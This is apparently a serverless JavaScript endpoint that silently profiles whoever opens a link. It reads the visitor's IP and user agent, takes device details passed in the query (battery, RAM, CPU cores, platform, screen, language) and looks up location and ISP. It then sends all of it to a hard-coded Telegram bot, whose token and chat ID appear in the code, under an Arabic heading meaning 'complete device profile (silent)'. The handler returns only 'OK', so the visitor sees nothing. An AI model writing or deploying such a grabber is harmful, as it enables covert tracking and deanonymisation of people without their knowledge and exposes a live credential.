export default async function handler(req, res) {
    const { res: screenRes, lang, mem, cores, plat, bat } = req.query;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const botToken = "8677038270:AAF7pXdGVjJDBUgftzoDP0lnJsJEbNPjhpQ";
    const chatId = "5244299184";

    try {
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,mobile,proxy`);
        const geo = await geoRes.json();

        const message = `📂 **ملف تعريف الجهاز الكامل (صامت)** 📂\n\n` +
                        `🌐 **الاتصال:** \`${ip}\` (${geo.isp})\n` +
                        `📍 **الموقع:** ${geo.country}, ${geo.city}\n` +
                        `🔋 **البطارية:** ${bat}\n\n` +
                        `💻 **مواصفات الهاردوير:**\n` +
                        `• الذاكرة (RAM): ${mem} GB تقريباً\n` +
                        `• المعالج: ${cores} Core\n` +
                        `• المنصة: ${plat}\n` +
                        `• الشاشة: ${screenRes}\n` +
                        `• اللغة: ${lang}\n\n` +
                        `📱 **البصمة الكاملة:**\n\`${userAgent}\`\n\n` +
                        `⏰ **التوقيت:** ${new Date().toLocaleString('ar-EG')}`;

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
        });
    } catch (e) {}
    res.status(200).send("OK");
}
